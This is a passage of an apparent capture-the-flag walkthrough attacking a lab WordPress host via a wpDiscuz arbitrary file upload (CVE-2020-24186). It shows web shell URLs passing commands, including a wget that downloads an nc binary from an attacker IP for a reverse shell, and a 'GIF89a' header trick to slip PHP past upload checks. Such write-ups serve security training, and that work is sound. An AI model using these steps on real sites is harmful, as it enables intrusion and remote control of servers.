...
So code execution is confirmed, however we need a reverse shell. The problem is the `nc` binary on the target doesn't allow `-e`. So we will upload our own.

http://blogger.pg/assets/fonts/blog/wp-content/uploads/2025/05/fgdgdwlvisugaeo-1748254915.6219.php?cmd=wget%20http://192.168.45.169:8000/nc

We can find out the current working directory

http://blogger.pg/assets/fonts/blog/wp-content/uploads/2025/05/fgdgdwlvisugaeo-1748254915.6219.php?cmd=pwd

![](php_pwd.png)

I found another exploit: [GitHub - meicookies/CVE-2020-24186: WpDiscuz 7.0.4 Arbitrary File Upload Exploit](https://github.com/meicookies/CVE-2020-24186)

Basically, put any php code but give it the file header "GIF89a", like so
...
And upload this in the comment section
